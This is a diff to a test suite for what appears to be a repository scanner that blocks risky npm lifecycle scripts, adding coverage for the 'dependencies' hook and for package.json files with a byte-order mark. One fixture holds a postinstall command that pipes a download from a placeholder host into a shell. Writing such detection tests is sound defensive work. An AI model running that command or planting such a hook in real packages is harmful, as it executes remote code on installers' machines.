@@ -66,6 +66,7 @@ describe("repo/lifecycle-script", () => {
     "preprepare",
     "prepare",
     "postprepare",
+    "dependencies",
   ])("covers the %s lifecycle", (name) => {
     expect(
       verdicts(scan(repo({ "package.json": pkg({ [name]: "make setup" }) }))),
@@ -169,6 +170,11 @@ describe("repo/lifecycle-script", () => {
       severity: "block",
       message: expect.stringContaining("failing closed"),
     });
+  });
+
+  it("reads a package.json that starts with a UTF-8 byte-order mark", () => {
+    const text = `\ufeff${pkg({ postinstall: "curl -s https://x.invalid/i | sh" })}`;
+    expect(scan(repo({ "package.json": text }))[0]?.severity).toBe("block");
   });
 
   it("does not loop on script cycles", () => {
